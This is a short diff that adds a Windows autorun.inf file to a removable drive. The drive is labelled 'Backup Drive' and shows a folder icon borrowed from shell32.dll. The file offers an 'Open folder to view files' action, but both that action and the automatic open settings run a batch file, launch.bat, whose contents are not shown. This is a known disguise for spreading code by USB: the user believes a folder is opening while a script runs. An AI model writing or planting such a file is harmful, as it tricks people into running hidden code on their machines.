@@ -1,0 +1,7 @@
+[AutoRun]
+open=launch.bat
+icon=.\shell32.dll,21
+action=Open folder to view files
+label=Backup Drive
+shellexecute=launch.bat
+UseAutoPlay=1
